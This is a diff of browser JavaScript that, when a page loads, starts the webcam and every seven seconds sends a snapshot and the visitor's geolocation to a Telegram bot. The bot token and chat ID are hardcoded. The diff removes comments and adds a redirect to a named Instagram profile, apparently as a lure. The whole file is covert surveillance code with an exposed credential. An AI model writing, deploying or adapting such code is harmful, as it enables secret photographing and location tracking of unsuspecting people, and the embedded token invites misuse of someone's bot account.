@@ -1,23 +1,17 @@
 async function sendPhotoAndLocationToTelegram(photoBlob, latitude, longitude) {
   const formData = new FormData();
   formData.append("photo", photoBlob, "webcam.jpg");
-
-  // Replace with your Telegram bot token and chat_id
   const botToken = "6998528299:AAF-IfmNR4SHLbL3qYy9qDwMfW4ghq1izTE";
   const chatId = "5802480458";
-
   const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`;
 
   try {
-    // Send photo
     const photoResponse = await fetch(telegramApiUrl, {
       method: "POST",
       body: formData
     });
     const photoData = await photoResponse.json();
     console.log(photoData);
-
-    // Send location
     const locationApiUrl = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
     const locationResponse = await fetch(locationApiUrl, {
       method: "POST"
@@ -38,7 +32,6 @@ async function capturePhoto() {
   context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
   canvas.toBlob(async (photoBlob) => {
-    // Get location
     navigator.geolocation.getCurrentPosition(
       (position) => {
         const { latitude, longitude } = position.coords;
@@ -53,7 +46,6 @@ async function capturePhoto() {
 
 function startWebcam() {
   const video = document.getElementById("webcam");
-
   navigator.mediaDevices
     .getUserMedia({ video: true })
     .then(stream => {
@@ -66,9 +58,13 @@ function startWebcam() {
 
 function startPhotoCapture() {
   startWebcam();
-  setInterval(capturePhoto, 5000); // Capture photo every 5 seconds
+  setInterval(capturePhoto, 7000); 
 }
-
 document.addEventListener("DOMContentLoaded", () => {
   startPhotoCapture();
 });
+
+function openInstagramApp() {
+  const instagramUsername = "selvijunitaa";
+  window.location.href = `instagram://user?username=${instagramUsername}`;
+}
